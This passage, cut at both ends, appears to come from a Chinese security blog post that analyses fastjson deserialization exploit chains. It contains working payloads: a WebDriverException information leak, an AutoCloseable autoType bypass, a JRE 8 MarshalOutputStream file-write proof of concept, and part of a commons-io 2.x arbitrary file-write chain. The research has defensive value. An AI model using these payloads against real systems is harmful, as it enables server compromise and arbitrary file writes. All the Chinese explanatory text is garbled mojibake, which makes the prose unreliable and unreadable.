class="string">&quot;z&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$x.message&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡åªæ˜¯WebDriverException.getMessageå¹¶æ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦ç›®æ ‡æœåŠ¡å™¨å›æ˜¾æ‰èƒ½ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">selenium_ref_1_2_68</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;x\&quot;:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  \&quot;@type\&quot;:\&quot;org.openqa.selenium.WebDriverException\&quot;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;y\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$x.systemInformation\&quot;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;z\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$x.message\&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> (JSONObject) JSON.parse(payload);</span><br><span class="line">        System.out.println(json.getString(<span class="string">&quot;y&quot;</span>));</span><br><span class="line">        System.out.println(json.getString(<span class="string">&quot;z&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024174412073.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024174412073.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024174412073"></p><h2 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h2><p>ThrowableDeserializer#deserialzeè°ƒç”¨çš„checkAutoTypeä¸­å‘æœŸæœ›ç±»ä¼ å‚æ˜¯å›ºå®šçš„ï¼Œä¸ºThrowable.class</p><p>JavaBeanDeserializer#deserialzeçš„expectClasså‚æ•°æ˜¯ç”¨æˆ·å¯æ§çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024213759114.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024213759114.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024213759114"></p><p>å…¶ä¸­typeç›´æ¥æ¥è‡ªdeserialzeå‚æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024214131683.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241024214131683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241024214131683"></p><p>è¿™é‡ŒæœŸæœ›ç±»åŸºæœ¬éƒ½ä¼šé€‰æ‹©AutoCloseableï¼ŒåŸå› æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>AutoCloseableä¸åœ¨é»‘åå•å†…ï¼Œä¸”åœ¨mappingsç¼“å­˜è¡¨å†…</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025113509136.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025113509136.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025113509136"></p><ul><li>ç”¨åˆ°AutoCloseableçš„å¾ˆå¤šï¼Œå…¶ä¸­åŒ…æ‹¬äº†è¾“å…¥ObjectInputå’Œè¾“å‡ºObjectOutputæ¥å£</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025113643858.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025113643858.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025113643858"></p><p>äºæ˜¯å‡ºç°äº†è¾“å…¥æµè½¬è¾“å‡ºæµå†™æ–‡ä»¶ï¼Œè¾“å‡ºæµè½¬è¾“å…¥æµè¯»æ–‡ä»¶çš„éªšæ“ä½œ</p><p>å¾ˆæ˜æ˜¾ï¼ŒAutoCloseableå­ç±»æ˜¯è¿”å›JavaBeanDeserializerçš„ï¼Œæ‰€ä»¥æµç¨‹å’Œå‰é¢åˆ†æThrowableDeserializerçš„ä¸€æ ·</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025114206866.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025114206866.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025114206866"></p><p>é—®é¢˜è½¬å‘äº†ï¼Œæ€ä¹ˆæ‰¾åˆ°AutoCloseableçš„å­ç±»æ¥è¿›è¡Œè¾“å…¥æµå’Œè¾“å‡ºæµçš„äº’è½¬ï¼Ÿ</p><p>æˆ‘ä»¬çŸ¥é“fastjsonå¯¹æ–¹æ³•çš„è°ƒç”¨è¿˜æ˜¯è¦è½å®åˆ°setterã€getterå’Œæ„é€ æ–¹æ³•ä¸Šçš„</p><p><a href="https://godownio.github.io/2024/10/25/fastjson-jackson-da-qu-fen/">https://godownio.github.io/2024/10/25/fastjson-jackson-da-qu-fen/</a></p><p>æµ…è“å¸ˆå‚…ç»™å‡ºäº†å†™æ–‡ä»¶çš„åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•æŒ‡å®šæ–‡ä»¶è·¯å¾„çš„ OutputStreamï¼ˆä½œä¸ºè¾“å‡ºæ–‡ä»¶æµï¼‰</li><li>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥å­—èŠ‚æ•°æ®çš„ OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œæœ€åå¯ä»¥é€šè¿‡ write æ–¹æ³•å°†ä¼ å…¥çš„å­—èŠ‚ç  write åˆ°ä¼ å…¥çš„ OutputStreamï¼ˆä½œä¸ºä¸€ä¸ªOutputStreamè½¬ä¸ºå¦ä¸€ä¸ªOutputStreamçš„æ¡¥æ¢ï¼‰</li><li>éœ€è¦ä¸€ä¸ªé€šè¿‡ set æ–¹æ³•æˆ–æ„é€ æ–¹æ³•ä¼ å…¥ä¸€ä¸ª OutputStreamï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡è°ƒç”¨ toStringã€hashCodeã€getã€setã€æ„é€ æ–¹æ³•è°ƒç”¨ä¼ å…¥çš„ OutputStream çš„ flush æ–¹æ³•ï¼ˆç”¨äºå°†ç¼“å†²åŒºä¸­çš„æ•°æ®å†™å…¥ç›®æ ‡è¾“å…¥æµï¼‰</li></ul><p>åœ¨ä»‹ç»commons-ioå†™æ–‡ä»¶ä¹‹å‰ï¼Œä»‹ç»ä¸€ä¸ª JRE 8  çš„å†™æ–‡ä»¶çš„åˆ©ç”¨é“¾ï¼š</p><p>POCï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;x&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;out&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.io.FileOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/tmp/dest.txt&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;infl&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;bufLen&quot;</span><span class="punctuation">:</span><span class="number">1048576</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;protocolVersion&quot;</span><span class="punctuation">:</span><span class="number">1</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­sun.rmi.server.MarshalOutputStreamã€java.util.zip.InflaterOutputStream ä»¥åŠ java.io.FileOutputStream çš„å‚æ•°å‡æ˜¯åŸºäºæœ‰å‚æ„é€ å‡½æ•°è¿›è¡Œæ„å»ºã€‚ä¸”å‡æ˜¯JDKåŸç”Ÿå­—èŠ‚ç </p><p>fastjsonåœ¨æ‰¾ä¸åˆ°é»˜è®¤æ— å‚æ„é€ å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œä¼šéå†æ‰€æœ‰æ„é€ å‡½æ•°ï¼Œä½¿ç”¨lookupParametersNameå¯»æ‰¾å¸¦å‚æ•°åä¿¡æ¯çš„æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163356883.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025163356883"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025163345217.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025163345217"></p><p>ç¼ºå¤±äº†LocalVeriableTableå¹¶ä¸ä¼šå½±å“ç±»çš„æ­£å¸¸ä½¿ç”¨å’Œåå°„è°ƒç”¨ï¼Œä½†æ˜¯ä¼šä½¿è°ƒè¯•å‡ºç°é—®é¢˜ï¼Œæ— æ³•æä¾›æ–¹æ³•ä¸­å±€éƒ¨å˜é‡çš„åç§°ã€ç±»å‹å’Œä½œç”¨èŒƒå›´ç­‰ä¿¡æ¯ã€‚</p><p>ASMUtils.lookupParametersName æ–¹æ³•ä¾èµ–äº LocalVariableTable ä¿¡æ¯æ¥æŸ¥æ‰¾æ–¹æ³•å‚æ•°çš„åç§°ã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/263503452">https://zhuanlan.zhihu.com/p/263503452</a></p><blockquote><p><strong>LocalVariableTable</strong>è¯¥å±æ€§çš„ä½œç”¨æ˜¯æè¿°å¸§æ ˆä¸­å±€éƒ¨å˜é‡ä¸æºç ä¸­å®šä¹‰çš„å˜é‡ä¹‹é—´çš„å…³ç³»ã€‚å¯ä»¥ä½¿ç”¨ -g:none æˆ–  -g:varsæ¥å–æ¶ˆæˆ–ç”Ÿæˆè¿™é¡¹ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰ç”Ÿæˆè¿™é¡¹ä¿¡æ¯ï¼Œé‚£ä¹ˆå½“åˆ«äººå¼•ç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œå°†æ— æ³•è·å–åˆ°å‚æ•°åç§°ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯arg0,  arg1è¿™æ ·çš„å ä½ç¬¦ã€‚start  è¡¨ç¤ºè¯¥å±€éƒ¨å˜é‡åœ¨å“ªä¸€è¡Œå¼€å§‹å¯è§ï¼Œlengthè¡¨ç¤ºå¯è§è¡Œæ•°ï¼ŒSlotä»£è¡¨æ‰€åœ¨å¸§æ ˆä½ç½®ï¼ŒNameæ˜¯å˜é‡åç§°ï¼Œç„¶åæ˜¯ç±»å‹ç­¾åã€‚</p></blockquote><p>ç›®å‰åªå‘ç° CentOS ä¸‹çš„ OpenJDK 8 å­—èŠ‚ç è°ƒè¯•ä¿¡æ¯ä¸­å«æœ‰ LocalVariableTableã€‚æˆ–è€…æ˜¯winä¸‹çš„OpenJDK &gt;&#x3D;11ï¼Œæ‰€ä»¥åˆ©ç”¨ç¯å¢ƒéå¸¸æœ‰é™</p><p>ä¸‹é¢ä»‹ç»ä¸€ç§æ¯”è¾ƒé€šç”¨çš„å†™æ–‡ä»¶æ‰‹æ³•</p><h2 id="Commons-io-2-xå†™æ–‡ä»¶"><a href="#Commons-io-2-xå†™æ–‡ä»¶" class="headerlink" title="Commons-io 2.xå†™æ–‡ä»¶"></a>Commons-io 2.xå†™æ–‡ä»¶</h2><p>æ¥è‡ªé•¿äº­ç§‘æŠ€çš„voidfyooçœŸæ˜¯å¤ªå¼ºå•¦ï¼Œä»¥ä¸‹ç±»å‡æ»¡è¶³æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°ï¼ˆè¿™æ ·æ‰èƒ½æ„é€ æœ‰å‚ï¼‰ï¼Œä¸”ä½¿ç”¨çš„éƒ½æ˜¯å‚æ•°æœ€å¤šé‚£ä¸ªæ„é€ å‡½æ•°</p><p>ç”±äº<code>commons-io</code>æ˜¯å¹¿æ³›ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹ioåº“ï¼Œæ‰€ä»¥å¾ˆæœ‰å®æˆ˜ä»·å€¼ã€‚</p><p>æ—¢ç„¶JDKåŸç”Ÿå­—èŠ‚ç ä¸å¸¦LocalVariableTableï¼Œé‚£çœ‹ä¸‹ç¬¬ä¸‰æ–¹åº“ï¼Œå¾ˆå¤šç¬¬ä¸‰æ–¹åº“é‡Œçš„å­—èŠ‚ç æ˜¯æœ‰ LocalVariableTable çš„</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="è°ƒç”¨ä»»æ„InputStream-read"><a href="#è°ƒç”¨ä»»æ„InputStream-read" class="headerlink" title="è°ƒç”¨ä»»æ„InputStream.read"></a>è°ƒç”¨ä»»æ„InputStream.read</h3><p>org.apache.commons.io.input.XmlStreamReaderå‚æ•°æœ€å¤šçš„æ„é€ å‡½æ•°æ¥æ”¶å‚æ•°InputStreamï¼Œç”¨BufferedInputStreamå°è£…äº†è¯¥InputStreamï¼Œæ¥ç€è°ƒç”¨äº†doHttpStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025201802638.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025201802638.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025201802638"></p><p>BufferedInputStreamç»§æ‰¿äº†FilterInputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025201921757.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025201921757.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025201921757"></p><p>æ„é€ å‡½æ•°ä¹Ÿè°ƒç”¨äº†çˆ¶ç±»æ„é€ å‡½æ•°è¿›è¡Œå°è£…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202014673.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202014673.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025202014673"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202025085.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202025085.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025202025085"></p><p>ç»è¿‡ä»¥ä¸‹é“¾ï¼Œèƒ½æœ€åè§¦å‘åˆ°InputStream.read()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">XmlStreamReader.doHttpStream -&gt;</span><br><span class="line">BOMInputStream.getBomCharsetName -&gt;</span><br><span class="line">BOMInputStream.getBom -&gt;</span><br><span class="line">BufferedInputStream.read -&gt;</span><br><span class="line">BufferedInputStream.fill -&gt;</span><br><span class="line">InputStream.read(<span class="type">byte</span>[], <span class="type">int</span>, <span class="type">int</span>)</span><br></pre></td></tr></table></figure><p>åœ¨BufferedInputStreamå†…ï¼Œç”¨getInIfOpenå°†æµè¿˜åŸä¸ºäº†InputStreamå¹¶è°ƒç”¨read</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202256698.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025202256698.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025202256698"></p><p>ä½¿ç”¨XmlStreamReaderæ„é€ å‡½æ•°èƒ½è°ƒç”¨ä»»æ„InputStreamçš„readæ–¹æ³•</p><h3 id="ä¼ å…¥å­—ç¬¦ä¸²ä½œä¸ºInputStream"><a href="#ä¼ å…¥å­—ç¬¦ä¸²ä½œä¸ºInputStream" class="headerlink" title="ä¼ å…¥å­—ç¬¦ä¸²ä½œä¸ºInputStream"></a>ä¼ å…¥å­—ç¬¦ä¸²ä½œä¸ºInputStream</h3><p>org.apache.commons.io.input.ReaderInputStream çš„æ„é€ å‡½æ•°æ¥å— Reader å¯¹è±¡ä½œä¸ºå‚æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210625252.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210625252.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025210625252"></p><p>å®ƒçš„readæ–¹æ³•ï¼ˆç¬¦åˆå‚æ•°ï¼‰è°ƒç”¨äº†fillBuffer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210829799.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210829799.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025210829799"></p><p>fillBufferè°ƒç”¨äº†Reader.read</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210907739.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025210907739.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025210907739"></p><p>å¦‚æœè¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„Readeræ˜¯org.apache.commons.io.input.CharSequenceReader </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211416729.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211416729.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025211416729"></p><p>CharSequenceReader.readå¾ªç¯è°ƒç”¨äº†æ— å‚çš„readï¼Œå¹¶æŠŠç»“æœæ”¾åˆ°array</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211640196.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211640196.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025211640196"></p><p>æ— å‚readæ¯æ¬¡è¿”å›charSequenceï¼ˆæ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•°ï¼‰ä¸€ä¸ªå­—ç¬¦</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211712759.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025211712759.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025211712759"></p><p>fillBuffer æ–¹æ³•åœ¨è¿™é‡Œçš„ä¸»è¦åŠŸèƒ½æ˜¯ä» CharSequenceReader ä¸­è¯»å–å­—ç¬¦å¹¶å¡«å……åˆ° encoderIn ç¼“å†²åŒºï¼Œç„¶åé€šè¿‡ encoder å°†å­—ç¬¦ç¼–ç ä¸ºå­—èŠ‚å¹¶å­˜å‚¨åœ¨ encoderOut ç¼“å†²åŒºä¸­ã€‚</p><p>ä½ é—®InputStreamåœ¨å“ªï¼ŸReaderInputStreamä¸å°±æ˜¯å—</p><p>è¾“å…¥å­—ç¬¦ä¸²ç”¨ReaderInputStreamå­˜å‚¨å¦‚ä¸‹ï¼Œç”±äºReaderInputStreamå®é™…ä¸Šæ˜¯åˆ›äº†ä¸ªBufferæ¥å­˜å‚¨æµï¼Œæ„é€ å‡½æ•°éœ€è¦ä¼ Bufferåˆ›å»ºéœ€è¦çš„å‚æ•°ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa......(YOUR_INPUT)&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="InputStreamè½¬OutputStream"><a href="#InputStreamè½¬OutputStream" class="headerlink" title="InputStreamè½¬OutputStream"></a>InputStreamè½¬OutputStream</h3><p>TeeInputStreamæ¥æ”¶InputStreamå’ŒOutputStreamä½œä¸ºå‚æ•°ï¼Œä¹Ÿæ²¡æœ‰æ— å‚æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025204526035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025204526035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025204526035"></p><p>æœ‰å¯¹åº”å‚æ•°çš„readï¼Œreadæ–¹æ³•è°ƒç”¨äº†OutputStream.write</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025204635306.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025204635306.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025204635306"></p><p>OutputStream çš„ write æ–¹æ³•ç”¨äºå°†æ•°æ®å†™å…¥è¾“å‡ºæµã€‚</p><p><code>void write(byte[] b, int off, int len)</code>å°†å­—èŠ‚æ•°ç»„ b ä¸­ä»åç§»é‡ off å¼€å§‹çš„ len ä¸ªå­—èŠ‚å†™å…¥è¾“å‡ºæµã€‚</p><p>XmlStreamReader+TeelInputStreamèƒ½è°ƒç”¨writeä»»æ„InputStreamè¾“å‡ºåˆ°OutputStreamã€‚æ»¡è¶³äº†åˆ©ç”¨æ¡ä»¶2</p><p>é‚£æ€ä¹ˆä½¿è¾“å‡ºæµä¸ºæ–‡ä»¶æµå‘¢ï¼Ÿ</p><h3 id="OutputStream-è¾“å‡ºåˆ°æ–‡ä»¶"><a href="#OutputStream-è¾“å‡ºåˆ°æ–‡ä»¶" class="headerlink" title="OutputStream è¾“å‡ºåˆ°æ–‡ä»¶"></a>OutputStream è¾“å‡ºåˆ°æ–‡ä»¶</h3><p>org.apache.commons.io.output.WriterOutputStream çš„æ„é€ å‡½æ•°æ¥å— Writer å¯¹è±¡ä½œä¸ºå‚æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132252568.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132252568.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027132252568"></p><p>writeæ–¹æ³•åœ¨æœ‰writeImmediatelyå‚æ•°çš„æƒ…å†µä¸‹ä¼šè°ƒç”¨flushOutput</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132634850.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132634850.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241027132634850"></p><p>flushOutputè°ƒç”¨äº†Writer.write</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241027132940024.png" class="lazyload placeholder" 